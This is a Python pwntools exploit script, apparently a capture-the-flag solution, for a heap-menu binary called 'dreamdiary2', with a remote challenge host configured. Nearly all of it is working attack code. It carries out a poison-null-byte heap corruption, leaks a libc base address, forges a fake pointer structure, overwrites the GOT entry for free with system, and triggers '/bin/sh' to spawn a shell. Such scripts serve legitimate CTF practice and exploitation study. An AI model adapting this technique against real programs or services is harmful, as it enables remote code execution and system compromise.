#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP
# =========================================================
exe = './dreamdiary2_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = elf.libc
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'einstein-bd91179989a5c1ab.deploy.phreaks.fr', 443

pid = None

def gdbscript():
    global pid
    gdbscript = f'''
    init-pwndbg
    # set sysroot /proc/{pid}/root
    c
    '''.format(**locals())
    return gdbscript

def initialize(argv=[]):
    global pid
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript())
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port, ssl=True)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/dreamdiary2"]).recvall().strip().decode()
        attach(int(pid), gdbscript=gdbscript(), sysroot=f"/proc/{pid}/root", exe='einstein')
        return p
    else:
        return process([exe] + argv)


# =========================================================
#                         EXPLOITS
# =========================================================
def alloc(size, data):
    io.sendlineafter(b'>> ', b'1')
    io.sendlineafter(b'Size: ', str(size).encode())
    io.sendafter(b'Data: ', data)

def edit(idx, data):
    io.sendlineafter(b'>> ', b'2')
    io.sendlineafter(b'Index: ', str(idx).encode())
    io.sendafter(b'Data: ', data)

def free(idx):
    io.sendlineafter(b'>> ', b'3')
    io.sendlineafter(b'Index: ', str(idx).encode())

def show(idx):
    io.sendlineafter(b'>> ', b'4')
    io.sendlineafter(b'Index: ', str(idx).encode())
    io.recvuntil(b'Data: ')
    return io.recvline().strip()

def exploit():
    #seph's solve script & write up https://bbs.kanxue.com/thread-284123.htm
    global io
    io = initialize()
    with log.progress("Preparing chunks"), context.silent:
        for _ in range(4):
            alloc(0x18, b"A")
        alloc(0x2f8, b"L")
        alloc(0x18, b"E")
        for i in range(5):
            free(i)

    with log.progress("Poison Nullbyte Attack"), context.silent:
        alloc(0x28, b"\x00"*0x20 + p64(0x30))  # 0
        alloc(0x208, b"\x00"*0x1f0 + p64(0x200) + p64(0x21))  # 1
        alloc(0xb8, b"F")  # 2
        free(1)
        edit(0, b"AA")
    with log.progress("Overlapping the chunk & leak address"), context.silent:
        alloc(0x188, b"G") # 1
        alloc(0x68, b"H")  # 3 (Victim)
        free(1)
        free(2)
        libc_leak = u64(show(3).ljust(8, b"\x00"))
        libc.address = libc_leak - 0x3c4b48
    log.info("Libc leak: %#x", libc_leak)
    log.info("Libc base: %#x", libc.address)
    with log.progress("Getting shell by making fake pointer struct chunk"), context.silent:
        free(3)
        alloc(0x2c8, b"\x00"*0x188 + p64(0x71) + p64(elf.sym["stdin"] - 0x3)) # 1
        alloc(0x68, b"A") # 3
        fake_arr = (
            p64(0x7) + p64(elf.got["free"]) + # fake_pointer 0 
            b"/bin/sh\0" + p64(0) + # input 1
            p64(elf.sym["stderr"]) + # idx 0
            p64(0x6020d0) + # idx 1
            p64(0x8) + p64(elf.sym["stderr"]+0x10)  # fake_pointer 1
        )
        alloc(0x68, b"\x00"*0x3 + fake_arr)
        edit(0, pack(libc.sym.system))
        free(1)
    io.interactive()

if __name__ == '__main__':
    exploit()
